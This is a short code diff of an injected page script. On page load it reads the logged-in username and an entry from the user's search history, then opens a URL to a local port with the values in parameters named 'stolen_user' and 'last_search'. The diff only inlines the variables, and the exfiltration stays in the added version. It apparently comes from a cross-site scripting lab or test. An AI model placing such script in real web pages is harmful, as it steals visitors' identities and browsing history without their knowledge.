@@ -1,4 +1,3 @@
 <script> document.addEventListener("DOMContentLoaded", function() { 
-    var user = document.getElementById('logged-in-user').textContent; 
-    var history = document.getElementById('history-list').children[1].textContent; 
-window.open("http://localhost:31337/?stolen_user=" + user + "&last_search=" + history); }); </script>
+window.open("http://localhost:31337/?stolen_user=" + document.getElementById('logged-in-user').textContent + "&last_search=" + document.getElementById('history-list').children[1].textContent); }); </script>
+
